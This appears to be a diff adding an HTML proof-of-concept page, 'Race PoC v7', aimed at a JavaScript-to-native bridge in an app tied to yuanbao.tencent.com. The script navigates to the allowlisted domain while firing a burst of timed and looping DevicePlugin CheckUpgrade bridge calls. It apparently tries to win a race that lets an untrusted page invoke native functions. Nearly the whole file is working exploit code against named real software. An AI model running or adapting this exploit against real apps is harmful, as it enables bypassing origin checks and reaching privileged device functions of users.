@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>Race PoC v7</title></head>
+<body>
+<h2>JSBridge Race - CheckUpgrade → yuanbao.tencent.com</h2>
+<pre id="log" style="font-size:10px;max-height:90vh;overflow:auto;"></pre>
+<script>
+var log = document.getElementById('log');
+function addLog(s) { log.textContent += '[' + Date.now() + '] ' + s + '\n'; }
+
+var callCount = 0;
+function callJSBridge(module, method, param) {
+    callCount++;
+    var callId = module + '_' + method + '_' + callCount + '_' + Date.now();
+    var cbName = 'cb_' + callId.replace(/[^a-zA-Z0-9_]/g, '_');
+    window[cbName] = function(jsonStr) {
+        addLog('<<< ' + method + ': ' + (typeof jsonStr === 'string' ? jsonStr.substring(0, 300) : ''));
+    };
+    var req = { callback: cbName, module: module, method: method, param: param || {}, callId: callId };
+    window.JSCallJavaMgr.JSCallNative(JSON.stringify(req));
+}
+
+function doRace() {
+    if (!window.JSCallJavaMgr) { addLog('ERROR: JSCallJavaMgr not found!'); return; }
+    addLog('=== Race PoC v7: yuanbao.tencent.com ===');
+    addLog('URL: ' + location.href);
+
+    // navigate 到 configured_apis 白名单域名
+    location.href = "https://yuanbao.tencent.com/";
+
+    // 多个延迟梯度，全部调 CheckUpgrade
+    var delays = [0, 50, 100, 150, 200, 250, 300, 400, 500];
+    for (var d = 0; d < delays.length; d++) {
+        (function(delay) {
+            setTimeout(function() {
+                try {
+                    callJSBridge('DevicePlugin', 'CheckUpgrade', {});
+                    addLog('[' + delay + 'ms] CheckUpgrade sent');
+                } catch(e) {
+                    addLog('[' + delay + 'ms] ERR: ' + e.message);
+                }
+            }, delay);
+        })(delays[d]);
+    }
+
+    // setInterval 高频调用 CheckUpgrade
+    var intervalCount = 0;
+    var iv = setInterval(function() {
+        intervalCount++;
+        try {
+            callJSBridge('DevicePlugin', 'CheckUpgrade', {});
+        } catch(e) {
+            clearInterval(iv);
+            addLog('[interval] stopped #' + intervalCount + ': ' + e.message);
+        }
+        if (intervalCount > 200) clearInterval(iv);
+    }, 0);
+
+    addLog('Race started');
+}
+
+setTimeout(function() {
+    addLog('Starting in 2s...');
+    setTimeout(doRace, 2000);
+}, 500);
+</script>
+</body>
+</html>
